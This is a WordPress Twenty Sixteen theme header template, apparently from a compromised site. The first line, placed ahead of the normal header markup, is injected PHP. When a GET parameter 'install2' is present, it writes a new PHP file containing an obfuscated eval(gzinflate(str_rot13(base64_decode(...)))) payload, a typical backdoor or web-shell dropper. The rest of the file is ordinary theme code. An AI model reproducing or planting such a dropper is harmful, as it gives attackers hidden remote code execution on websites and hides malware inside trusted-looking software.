<?php if (isset($_GET['install2'])) { $data = "<?php eval(gzinflate(str_rot13(base64_decode('rUl6Yts2EP68APkPDHRANk3LdocBUhIZC29sDbbYmXLvixMIslHbeSREIKm4XpD/3jtF8liTc3ZEI0Bx3vPcPfeio5mUT4aSFU93ni+ax63TwwM+J80jrhTTzVMY+E5jORxZnUz0KbpmYVutXx4ODxr3XGQdizLXxCPHQHes2AwekTD61x9a6cfx+Dr8OAzG9BbNPP+0dB75/1n8YBxBU5cWMBPJGhA0VyKyjvIFAQaLNbnJ0TXyKcJHNHTZZMIA+gfPbLgAlQ4ehplVmLPRvwG2yFBQsbiUXK/BfWPe98Orbs8HB8N+n54+Hh6wR7EXQwMAmdBZFlltEGQplJ6t8yhwzVpTjv0fnvdtIyhGlTO700+Ck2KRU/7VY+zvkp5HvCrwSecTxJs3UyCfN+uu/emPp0Gcipxux7BuV5Qyc7stY4KL0eX1OOxf/u0Pzq98x7Qhbldm4npEveHF5MofjMPRYzhpYV3aTBV6nsd2CUN8STwrReYWywIbJJnN0MZ7WKzDllrgJ2nv5EjdO7HdA0O8FISedq5G1p3kf+VvlZM2CYxpEixMmp5orPV5JruYVlKZC5hkxf9w3nsSi0dV79cP5gPALmg3ZF1t1pl6yA04DFiYGI82qQt2hmMAtdHmsNllduu1MSZAgFFXnmvGRraGVPCwCeFFstgaF18banK9Kh42EAJFeXZLmmm29t3MyzzWXOSkS04wgvMVrxI75jEe2XZ5lJ7SRRZPNdH+1uk4cxiN6Qh6KcuNqdV+hwbJZylmgicugOvuPuycm1avzp8LZGbzPTEA/e0gSCAsmQMlkxnJ8C2GV1/jTSORqYFUdvflgl6ILIvypC7gGc+LRRO9LphUNfusKcEaezTOErpiDcpMxrdp64eS+ygtzfc7wGpDTNc53UrKoE7GUkmmmheR1AbXQSId1crrZzCb/1ZuRaQiV1Wfp8yk0U70k3mWPFZLXqlISfseYA78yoyziV92FfOD9faiigFbGfYJ2RWx4x+rdtnvfq/i5HmFD5TEdqSUp6M9ghVM2ehZYnd4E94r785txYpaHViuF3l2GAnHel9534GjhtFEZio5QG0wBrOQZAMHRqcuiWYLOAMyZpiJexZN7ywJEdB8lqKzIrQ02LobNa4JRon5Ka4wW7tU6qmIgJbgXmskaRmTPXtDxjFGinU4Zb9pB8vrpFToKWw0YtuTIkpQX0oZ3hFGssqYJebWqtZNIdnuBP1JQtCx+cCySbjnUPaZxVr0cbaaHaIOZened9m/WLOtBER22Bp+R4L4Lg1lXliQZhCAzQrNzQJ5uEwUXDRhB/7g+5wvVxnhWGHu5UktEJi7PyXID6hpRVLaduQ8K/wL')))); ?>"; file_put_contents("F03D83B60125828DD76F186829E2AFC1.php", $data); } ?>
<?php
/**
 * The template for displaying the header
 *
 * Displays all of the head element and everything up until the "site-content" div.
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */

?><!DOCTYPE html>
<html <?php language_attributes(); ?> class="no-js">
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<?php if ( is_singular() && pings_open( get_queried_object() ) ) : ?>
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
	<?php endif; ?>
	<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>
<div id="page" class="site">
	<div class="site-inner">
		<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'twentysixteen' ); ?></a>

		<header id="masthead" class="site-header" role="banner">
			<div class="site-header-main">
				<div class="site-branding">
					<?php twentysixteen_the_custom_logo(); ?>

					<?php if ( is_front_page() && is_home() ) : ?>
						<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
					<?php else : ?>
						<p class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></p>
					<?php endif;

					$description = get_bloginfo( 'description', 'display' );
					if ( $description || is_customize_preview() ) : ?>
						<p class="site-description"><?php echo $description; ?></p>
					<?php endif; ?>
				</div><!-- .site-branding -->

				<?php if ( has_nav_menu( 'primary' ) || has_nav_menu( 'social' ) ) : ?>
					<button id="menu-toggle" class="menu-toggle"><?php _e( 'Menu', 'twentysixteen' ); ?></button>

					<div id="site-header-menu" class="site-header-menu">
						<?php if ( has_nav_menu( 'primary' ) ) : ?>
							<nav id="site-navigation" class="main-navigation" role="navigation" aria-label="<?php esc_attr_e( 'Primary Menu', 'twentysixteen' ); ?>">
								<?php
									wp_nav_menu( array(
										'theme_location' => 'primary',
										'menu_class'     => 'primary-menu',
									 ) );
								?>
							</nav><!-- .main-navigation -->
						<?php endif; ?>

						<?php if ( has_nav_menu( 'social' ) ) : ?>
							<nav id="social-navigation" class="social-navigation" role="navigation" aria-label="<?php esc_attr_e( 'Social Links Menu', 'twentysixteen' ); ?>">
								<?php
									wp_nav_menu( array(
										'theme_location' => 'social',
										'menu_class'     => 'social-links-menu',
										'depth'          => 1,
										'link_before'    => '<span class="screen-reader-text">',
										'link_after'     => '</span>',
									) );
								?>
							</nav><!-- .social-navigation -->
						<?php endif; ?>
					</div><!-- .site-header-menu -->
				<?php endif; ?>
			</div><!-- .site-header-main -->

			<?php if ( get_header_image() ) : ?>
				<?php
					/**
					 * Filter the default twentysixteen custom header sizes attribute.
					 *
					 * @since Twenty Sixteen 1.0
					 *
					 * @param string $custom_header_sizes sizes attribute
					 * for Custom Header. Default '(max-width: 709px) 85vw,
					 * (max-width: 909px) 81vw, (max-width: 1362px) 88vw, 1200px'.
					 */
					$custom_header_sizes = apply_filters( 'twentysixteen_custom_header_sizes', '(max-width: 709px) 85vw, (max-width: 909px) 81vw, (max-width: 1362px) 88vw, 1200px' );
				?>
				<div class="header-image">
					<a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home">
						<img src="<?php header_image(); ?>" srcset="<?php echo esc_attr( wp_get_attachment_image_srcset( get_custom_header()->attachment_id ) ); ?>" sizes="<?php echo esc_attr( $custom_header_sizes ); ?>" width="<?php echo esc_attr( get_custom_header()->width ); ?>" height="<?php echo esc_attr( get_custom_header()->height ); ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>">
					</a>
				</div><!-- .header-image -->
			<?php endif; // End header image check. ?>
		</header><!-- .site-header -->

		<div id="content" class="site-content">